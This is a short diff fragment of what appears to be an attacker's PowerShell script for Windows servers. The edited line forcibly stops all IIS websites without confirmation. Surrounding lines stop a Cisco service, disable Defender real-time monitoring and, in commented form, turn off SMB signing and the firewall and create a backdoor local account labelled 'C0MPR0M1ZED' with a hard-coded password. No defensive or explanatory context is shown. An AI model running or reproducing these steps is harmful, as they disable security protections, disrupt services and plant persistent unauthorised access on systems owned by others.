@@ -7,7 +7,7 @@ Stop-Service -Name "CiscoSCMS" -Force -ErrorAction Ignore
 #Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySignature $false -Force
 #Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction Ignore
 Set-MpPreference -DisableRealtimeMonitoring $true
-Get-IISSite | ForEach{Stop-IISSite -Name $_}
+Get-IISSite | ForEach{Stop-IISSite -Name $_ -Force -Confirm:$false}
 
 #$pwd=ConvertTo-SecureString -String "ZznRImk1TefX3AWinSCx" -AsPlainText -Force
 #New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires -Description "C0MPR0M1ZED" -Password $pwd -PasswordNeverExpires -UserMayNotChangePassword
